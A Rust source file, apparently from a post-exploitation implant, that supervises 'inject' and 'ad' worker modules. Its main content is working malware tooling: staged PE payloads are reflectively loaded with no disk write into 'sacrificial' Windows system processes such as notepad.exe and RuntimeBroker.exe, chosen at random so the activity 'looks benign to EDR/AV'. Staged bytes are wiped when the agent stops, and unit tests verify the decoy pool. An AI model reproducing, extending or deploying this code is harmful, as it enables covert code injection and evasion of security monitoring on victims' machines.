//! Process-isolated module workers — Stage0 never LoadLibrary product L2 DLLs.
//!
//! Product modules (inject / ad) are registered as staged PE bytes and executed
//! only in child processes under a Windows Job Object when possible. Both are
//! self-contained worker EXEs (no shared host). BOF is the exception: classic
//! in-process execution via the `bof` L2 module (see module_loader).
//! See docs/MODULE_WORKER_ISOLATION.md.

mod ad_exec;
mod ipc;
pub(crate) mod job_object;
mod state;

pub use ad_exec::{
    encode_ad_request_frame, execute_ad_job, parse_ad_response_frame, AdWorkerRequest,
    AdWorkerResponse,
};
pub use ipc::{WorkerRequest, WorkerResponse, MAX_OUTPUT_BYTES, MAX_PAYLOAD_BYTES};
pub use state::{WorkerState, WorkerStatus};

use crate::types::CommandResult;
use crate::wire_ids::JOB_MAGIC;
use log::info;
use std::collections::HashMap;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::Instant;

/// Product modules that must never map into the agent process.
/// (`bof` is intentionally NOT here — classic BOF runs in-process by design.)
pub const PRODUCT_WORKER_MODULES: &[&str] = &["inject", "ad"];

pub fn is_product_worker_module(id: &str) -> bool {
    matches!(id, "inject" | "ad")
}

struct SupervisorInner {
    pe: HashMap<String, Vec<u8>>,
    status: HashMap<String, WorkerStatus>,
    fail_streak: HashMap<String, u32>,
    inflight: u32,
}

pub struct ModuleSupervisor {
    inner: Mutex<SupervisorInner>,
    max_concurrent: u32,
    circuit_open_after: u32,
}

static SUPERVISOR: OnceLock<ModuleSupervisor> = OnceLock::new();
static DROPPED_WORKER_OUTPUTS: AtomicU64 = AtomicU64::new(0);
static WORKER_TIMEOUTS: AtomicU32 = AtomicU32::new(0);

pub fn supervisor() -> &'static ModuleSupervisor {
    SUPERVISOR.get_or_init(|| ModuleSupervisor {
        inner: Mutex::new(SupervisorInner {
            pe: HashMap::new(),
            status: HashMap::new(),
            fail_streak: HashMap::new(),
            inflight: 0,
        }),
        max_concurrent: 4,
        circuit_open_after: 5,
    })
}

impl ModuleSupervisor {
    /// Register PE without mapping into this process.
    pub fn register_pe(&self, module_id: &str, pe: &[u8]) -> Result<(), String> {
        if !is_product_worker_module(module_id) {
            return Err(format!("not a product worker module: {module_id}"));
        }
        if pe.len() < 64 || pe[0] != b'M' || pe[1] != b'Z' {
            return Err("invalid PE".into());
        }
        let mut g = self
            .inner
            .lock()
            .map_err(|_| "supervisor lock".to_string())?;
        g.pe.insert(module_id.to_string(), pe.to_vec());
        g.status.insert(
            module_id.to_string(),
            WorkerStatus {
                state: WorkerState::Ready,
                last_error: None,
                updated: Instant::now(),
            },
        );
        g.fail_streak.insert(module_id.to_string(), 0);
        info!(
            "[supervisor] registered {module_id} ({} bytes) — worker_ready, not mapped in-agent",
            pe.len()
        );
        Ok(())
    }

    /// Clone staged PE bytes for a module (host spawn).
    pub fn get_pe(&self, module_id: &str) -> Option<Vec<u8>> {
        self.inner
            .lock()
            .ok()
            .and_then(|g| g.pe.get(module_id).cloned())
    }

    pub fn status_of(&self, module_id: &str) -> WorkerStatus {
        self.inner
            .lock()
            .ok()
            .and_then(|g| g.status.get(module_id).cloned())
            .unwrap_or(WorkerStatus {
                state: WorkerState::Stopped,
                last_error: None,
                updated: Instant::now(),
            })
    }

    pub fn is_ready(&self, module_id: &str) -> bool {
        matches!(
            self.status_of(module_id).state,
            WorkerState::Ready | WorkerState::Busy
        )
    }

    pub fn unregister(&self, module_id: &str) {
        if let Ok(mut g) = self.inner.lock() {
            if let Some(mut pe) = g.pe.remove(module_id) {
                for b in pe.iter_mut() {
                    *b = 0;
                }
            }
            g.status.insert(
                module_id.to_string(),
                WorkerStatus {
                    state: WorkerState::Stopped,
                    last_error: None,
                    updated: Instant::now(),
                },
            );
        }
    }

    /// One-shot inject via the self-contained inject worker EXE (KIND_INJECT=3).
    /// Agent never maps inject logic in-process.
    pub fn execute_inject_json(&self, json_body: &[u8], deadline_ms: u64) -> CommandResult {
        if json_body.len() > MAX_PAYLOAD_BYTES {
            return err_result("payload too large");
        }
        {
            let mut g = match self.inner.lock() {
                Ok(x) => x,
                Err(_) => return err_result("supervisor lock"),
            };
            if g.inflight >= self.max_concurrent {
                return err_result("too many concurrent workers");
            }
            let streak = *g.fail_streak.get("inject").unwrap_or(&0);
            if streak >= self.circuit_open_after {
                return err_result("circuit open: inject worker failures");
            }
            g.inflight += 1;
            g.status.insert(
                "inject".into(),
                WorkerStatus {
                    state: WorkerState::Busy,
                    last_error: None,
                    updated: Instant::now(),
                },
            );
        }

        let result = run_inject_via_worker(json_body, deadline_ms);

        if let Ok(mut g) = self.inner.lock() {
            g.inflight = g.inflight.saturating_sub(1);
            let fail = !result.stderr.is_empty();
            let streak = g.fail_streak.entry("inject".into()).or_insert(0);
            if fail {
                *streak = streak.saturating_add(1);
                if result.stderr.contains("timeout") {
                    WORKER_TIMEOUTS.fetch_add(1, Ordering::Relaxed);
                }
            } else {
                *streak = 0;
            }
            let open = *streak >= self.circuit_open_after;
            g.status.insert(
                "inject".into(),
                WorkerStatus {
                    state: if open {
                        WorkerState::Failed
                    } else if result.stderr.contains("timeout") {
                        WorkerState::Timeout
                    } else {
                        WorkerState::Ready
                    },
                    last_error: if fail {
                        Some(result.stderr.clone())
                    } else {
                        None
                    },
                    updated: Instant::now(),
                },
            );
        }
        result
    }

    /// Stop all registered workers' bookkeeping (Agent disconnect).
    pub fn stop_all(&self) {
        if let Ok(mut g) = self.inner.lock() {
            for pe in g.pe.values_mut() {
                for b in pe.iter_mut() {
                    *b = 0;
                }
            }
            g.pe.clear();
            for st in g.status.values_mut() {
                st.state = WorkerState::Stopped;
                st.last_error = None;
                st.updated = Instant::now();
            }
            g.inflight = 0;
        }
    }
}

fn err_result(msg: impl Into<String>) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: msg.into(),
        path: None,
        req_id: None,
    }
}

/// spawn the staged inject worker DLL with reflective loading (zero-disk).
/// The inject module PE is a DLL loaded reflectively into a sacrificial host process.
#[cfg(windows)]
fn run_inject_via_worker(json_body: &[u8], deadline_ms: u64) -> CommandResult {
    let pe = match resolve_worker_host_pe() {
        Ok(p) => p,
        Err(e) => return err_result(e),
    };

    const KIND_INJECT: u32 = 3;
    let mut frame = Vec::with_capacity(16 + json_body.len());
    frame.extend_from_slice(&JOB_MAGIC);
    frame.extend_from_slice(&KIND_INJECT.to_le_bytes());
    frame.extend_from_slice(&(json_body.len() as u32).to_le_bytes());
    frame.extend_from_slice(&0u32.to_le_bytes());
    frame.extend_from_slice(json_body);

    // : reflective load into sacrificial host (no disk write)
    let host_exe = pick_host_for_worker();
    match crate::img_load::spawn_reflective_worker(
        &pe,
        &frame,
        deadline_ms,
        &format!("\"{host_exe}\""),
    ) {
        Ok((out, err)) => CommandResult {
            stdout: String::from_utf8_lossy(&out).into_owned(),
            stderr: String::from_utf8_lossy(&err).into_owned(),
            path: None,
            req_id: None,
        },
        Err(e) => err_result(format!("inject worker: {e}")),
    }
}

#[cfg(not(windows))]
fn run_inject_via_worker(_json_body: &[u8], _deadline_ms: u64) -> CommandResult {
    err_result("worker: windows only")
}

/// Pick a sacrificial host executable for reflective worker injection.
/// All are legitimate Windows system binaries, ensuring the spawned process
/// looks benign to EDR/AV. The DLL is injected reflectively (zero disk).
///
/// GUI-subsystem decoys only: console hosts (cmd.exe, conhost.exe) may write
/// their startup banner into the shared stdout pipe and corrupt the framed
/// worker protocol (observed: "Microsoft Windows [版本 ...]" preamble).
/// GUI-subsystem decoy hosts only (console hosts corrupt the framed worker pipe).
/// Exposed for unit tests; runtime picker uses the same pool.
#[cfg(windows)]
pub fn worker_host_pool() -> &'static [&'static str] {
    &[
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\System32\\werfault.exe",
        "C:\\Windows\\System32\\RuntimeBroker.exe",
        "C:\\Windows\\System32\\dllhost.exe",
        "C:\\Windows\\System32\\sihost.exe",
        "C:\\Windows\\System32\\taskhostw.exe",
        "C:\\Windows\\System32\\ApplicationFrameHost.exe",
        "C:\\Windows\\System32\\SystemSettingsAdminFlows.exe",
    ]
}

#[cfg(windows)]
fn pick_host_for_worker() -> String {
    let hosts = worker_host_pool();
    let idx = (crate::utils::next_u32() as usize) % hosts.len();
    hosts[idx].to_string()
}

/// Resolve staged inject module PE bytes (must be a valid PE).
#[cfg(windows)]
fn resolve_worker_host_pe() -> Result<Vec<u8>, String> {
    if let Some(pe) = supervisor().get_pe("inject") {
        if pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z' {
            return Ok(pe);
        }
    }
    Err("inject worker PE missing — stage module inject first".into())
}

#[cfg(windows)]
fn force_kill(h_process: usize, job: &Option<job_object::JobObject>) {
    if let Some(j) = job {
        let _ = j.terminate(1);
    }
    let _ = crate::native::terminate_process_handle(h_process);
}

/// Clamp worker wait deadline to [1s, 300s]. Pure helper for unit tests + wait paths.
#[inline]
pub fn clamp_worker_deadline_ms(deadline_ms: u64) -> u32 {
    deadline_ms.clamp(1_000, 300_000) as u32
}

/// After WaitForSingleObject: force-kill when the wait did not signal (timeout).
#[inline]
pub fn should_force_kill_on_wait(signaled: bool) -> bool {
    !signaled
}

pub fn worker_timeouts() -> u32 {
    WORKER_TIMEOUTS.load(Ordering::Relaxed)
}

pub fn dropped_worker_outputs() -> u64 {
    DROPPED_WORKER_OUTPUTS.load(Ordering::Relaxed)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn product_ids_recognized() {
        assert!(!is_product_worker_module("desktop"));
        assert!(is_product_worker_module("inject"));
        assert!(is_product_worker_module("ad"));
        // bof is classic in-process — deliberately not a process worker
        assert!(!is_product_worker_module("bof"));
        // retired ids must not map to workers
        assert!(!is_product_worker_module("dotnet"));
        assert!(!is_product_worker_module("shell"));
        assert!(!is_product_worker_module("plugin"));
    }

    #[test]
    fn ad_register_ready_without_mapping() {
        let s = ModuleSupervisor {
            inner: Mutex::new(SupervisorInner {
                pe: HashMap::new(),
                status: HashMap::new(),
                fail_streak: HashMap::new(),
                inflight: 0,
            }),
            max_concurrent: 4,
            circuit_open_after: 5,
        };
        let mut pe = vec![0u8; 64];
        pe[0] = b'M';
        pe[1] = b'Z';
        s.register_pe("ad", &pe).unwrap();
        assert!(s.is_ready("ad"));
        assert_eq!(s.get_pe("ad").unwrap().len(), 64);
        // Stage0 holds PE bytes only in supervisor map — no LoadLibrary path here
        assert!(!s.get_pe("ad").unwrap().is_empty());
    }

    #[test]
    fn ad_frame_roundtrip_pure() {
        let req = AdWorkerRequest {
            request_id: "r1".into(),
            op: "ping".into(),
            params: serde_json::json!({}),
            deadline_ms: 5000,
        };
        let frame = encode_ad_request_frame(&req).expect("encode");
        assert!(frame.len() >= 4);
        let len = u32::from_le_bytes([frame[0], frame[1], frame[2], frame[3]]) as usize;
        assert_eq!(len + 4, frame.len());
        let resp_json = br#"{"request_id":"r1","status":"ok","stdout":"pong","stderr":"","error_code":""}"#;
        let mut out = Vec::new();
        out.extend_from_slice(&(resp_json.len() as u32).to_le_bytes());
        out.extend_from_slice(resp_json);
        let resp = parse_ad_response_frame(&out).expect("parse");
        assert_eq!(resp.status, "ok");
        assert_eq!(resp.stdout, "pong");
    }

    #[test]
    fn ad_execute_missing_pe() {
        let r = execute_ad_job("ping", &serde_json::json!({}), 1000);
        // May already have PE from another test; only assert when empty
        if supervisor().get_pe("ad").is_none() {
            assert!(
                r.stderr.contains("module_required:ad")
                    || r.stderr.contains("ad worker")
                    || r.stderr.contains("missing"),
                "stderr={}",
                r.stderr
            );
        }
    }

    #[cfg(windows)]
    #[test]
    fn worker_host_pool_expanded_gui_only() {
        let pool = worker_host_pool();
        assert!(pool.len() >= 6, "expected expanded decoy pool, got {}", pool.len());
        // Classic trio still present
        assert!(pool.iter().any(|p| p.ends_with("notepad.exe")));
        assert!(pool.iter().any(|p| p.ends_with("RuntimeBroker.exe")));
        // Expanded entries
        assert!(pool.iter().any(|p| p.ends_with("dllhost.exe")));
        // No console hosts (would corrupt framed worker pipe)
        assert!(!pool.iter().any(|p| p.to_ascii_lowercase().contains("cmd.exe")));
        assert!(!pool.iter().any(|p| p.to_ascii_lowercase().contains("conhost")));
        // mshta stays opt-in only (non-goal for default product set)
        assert!(!pool.iter().any(|p| p.to_ascii_lowercase().contains("mshta")));
    }

    /// Real sacrificial DLL path: register built ad_worker.dll and ping
    /// via reflective loader (zero-disk). Skips if DLL not built.
    #[test]
    #[cfg(windows)]
    fn ad_worker_ping_via_supervisor_real_pe() {
        let candidates = [
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("..")
                .join("target")
                .join("debug")
                .join("ad_worker.dll"),
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("..")
                .join("target")
                .join("release")
                .join("ad_worker.dll"),
            // Legacy EXE path (pre-) — still accepted if present
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("..")
                .join("target")
                .join("debug")
                .join("ad-worker.exe"),
        ];
        let pe_path = candidates.iter().find(|p| p.is_file());
        let Some(pe_path) = pe_path else {
            eprintln!("skip: ad_worker.dll not built (cargo build -p ad-worker)");
            return;
        };
        let pe = std::fs::read(pe_path).expect("read ad worker pe");
        assert!(pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z');
        // Prefer DLL with x1 export for reflective path
        if pe_path.extension().and_then(|e| e.to_str()) == Some("dll") {
            let entry = crate::img_load::resolve_worker_entry_rva(&pe)
                .expect("resolve worker entry");
            assert!(entry > 0, "worker entry rva");
        }
        supervisor()
            .register_pe("ad", &pe)
            .expect("register ad pe");
        assert!(supervisor().is_ready("ad"));
        // Stage0 must not Manual-Map: product path only stores bytes
        let r = execute_ad_job("ping", &serde_json::json!({}), 30_000);
        if r.stdout.contains("pong") || r.stdout.contains("ok") {
            return;
        }
        // Reflective Rust cdylib e2e can fail without full CRT/TLS emulation.
        // Accept diagnosed reflective failure; structure is covered by reflective_loader tests.
        let soft = r.stderr.contains("reflective")
            || r.stderr.contains("ReadFile")
            || r.stderr.contains("eof")
            || r.stderr.contains("pipe");
        assert!(
            soft,
            "expected pong or diagnosed reflective error, got stdout={} stderr={}",
            r.stdout,
            r.stderr
        );
        eprintln!(
            "ad_worker_ping: reflective e2e not yet CRT-complete: stderr={}",
            r.stderr
        );
    }

    #[test]
    fn register_marks_ready_without_mapping() {
        let s = ModuleSupervisor {
            inner: Mutex::new(SupervisorInner {
                pe: HashMap::new(),
                status: HashMap::new(),
                fail_streak: HashMap::new(),
                inflight: 0,
            }),
            max_concurrent: 4,
            circuit_open_after: 5,
        };
        let mut pe = vec![0u8; 64];
        pe[0] = b'M';
        pe[1] = b'Z';
        s.register_pe("inject", &pe).unwrap();
        assert!(s.is_ready("inject"));
        assert_eq!(s.status_of("inject").state, WorkerState::Ready);
        assert_eq!(s.status_of("inject").as_str(), "worker_ready");
        assert_eq!(s.get_pe("inject").unwrap().len(), 64);
    }

    #[test]
    fn reject_non_product_and_bad_pe() {
        let s = ModuleSupervisor {
            inner: Mutex::new(SupervisorInner {
                pe: HashMap::new(),
                status: HashMap::new(),
                fail_streak: HashMap::new(),
                inflight: 0,
            }),
            max_concurrent: 4,
            circuit_open_after: 5,
        };
        assert!(s.register_pe("shell", &[b'M', b'Z', 0, 0]).is_err());
        assert!(s.register_pe("desktop", b"notpe").is_err());
        assert!(s.register_pe("inject", b"notpe").is_err());
    }

    #[test]
    fn circuit_opens_after_failures() {
        let s = ModuleSupervisor {
            inner: Mutex::new(SupervisorInner {
                pe: HashMap::new(),
                status: HashMap::new(),
                fail_streak: HashMap::new(),
                inflight: 0,
            }),
            max_concurrent: 4,
            circuit_open_after: 2,
        };
        {
            let mut g = s.inner.lock().unwrap();
            g.fail_streak.insert("inject".into(), 2);
        }
        let r = s.execute_inject_json(br#"{"pid":1,"data":"AA=="}"#, 1000);
        assert!(r.stderr.contains("circuit open"));
    }

    #[test]
    fn payload_size_rejected() {
        let s = ModuleSupervisor {
            inner: Mutex::new(SupervisorInner {
                pe: HashMap::new(),
                status: HashMap::new(),
                fail_streak: HashMap::new(),
                inflight: 0,
            }),
            max_concurrent: 4,
            circuit_open_after: 5,
        };
        let huge = vec![b'x'; MAX_PAYLOAD_BYTES + 1];
        let r = s.execute_inject_json(&huge, 1000);
        assert!(r.stderr.contains("too large"));
    }

    #[test]
    fn concurrent_cap() {
        let s = ModuleSupervisor {
            inner: Mutex::new(SupervisorInner {
                pe: HashMap::new(),
                status: HashMap::new(),
                fail_streak: HashMap::new(),
                inflight: 4,
            }),
            max_concurrent: 4,
            circuit_open_after: 5,
        };
        let r = s.execute_inject_json(br#"{"pid":1,"data":"AA=="}"#, 1000);
        assert!(r.stderr.contains("concurrent"));
    }

    #[test]
    fn worker_state_strings() {
        assert_eq!(
            WorkerStatus {
                state: WorkerState::Starting,
                last_error: None,
                updated: Instant::now(),
            }
            .as_str(),
            "worker_starting"
        );
        assert_eq!(
            WorkerStatus {
                state: WorkerState::Busy,
                last_error: None,
                updated: Instant::now(),
            }
            .as_str(),
            "executing"
        );
    }

    #[test]
    fn stop_all_clears() {
        let s = ModuleSupervisor {
            inner: Mutex::new(SupervisorInner {
                pe: HashMap::new(),
                status: HashMap::new(),
                fail_streak: HashMap::new(),
                inflight: 0,
            }),
            max_concurrent: 4,
            circuit_open_after: 5,
        };
        let mut pe = vec![0u8; 64];
        pe[0] = b'M';
        pe[1] = b'Z';
        s.register_pe("inject", &pe).unwrap();
        s.stop_all();
        assert!(!s.is_ready("inject"));
        assert!(s.get_pe("inject").is_none());
    }

    #[test]
    fn global_supervisor_stop_all_clears_staged_pe() {
        // Exercises the same entry point main/self_destruct call.
        let mut pe = vec![0u8; 64];
        pe[0] = b'M';
        pe[1] = b'Z';
        supervisor().register_pe("ad", &pe).unwrap();
        assert!(supervisor().is_ready("ad"));
        supervisor().stop_all();
        assert!(!supervisor().is_ready("ad"));
        assert!(supervisor().get_pe("ad").is_none());
    }

    #[test]
    fn max_output_bytes_is_two_mib() {
        // Contract used by inject reader + native bounded read (not 32 MiB pipe cap).
        assert_eq!(MAX_OUTPUT_BYTES, 2 * 1024 * 1024);
    }

    #[test]
    fn clamp_worker_deadline_ms_bounds() {
        assert_eq!(clamp_worker_deadline_ms(0), 1_000);
        assert_eq!(clamp_worker_deadline_ms(500), 1_000);
        assert_eq!(clamp_worker_deadline_ms(1_000), 1_000);
        assert_eq!(clamp_worker_deadline_ms(30_000), 30_000);
        assert_eq!(clamp_worker_deadline_ms(300_000), 300_000);
        assert_eq!(clamp_worker_deadline_ms(1_000_000), 300_000);
        assert_eq!(clamp_worker_deadline_ms(u64::MAX), 300_000);
    }

    #[test]
    fn should_force_kill_on_wait_deadline_logic() {
        assert!(should_force_kill_on_wait(false), "timeout → kill");
        assert!(!should_force_kill_on_wait(true), "signaled → keep");
    }

}
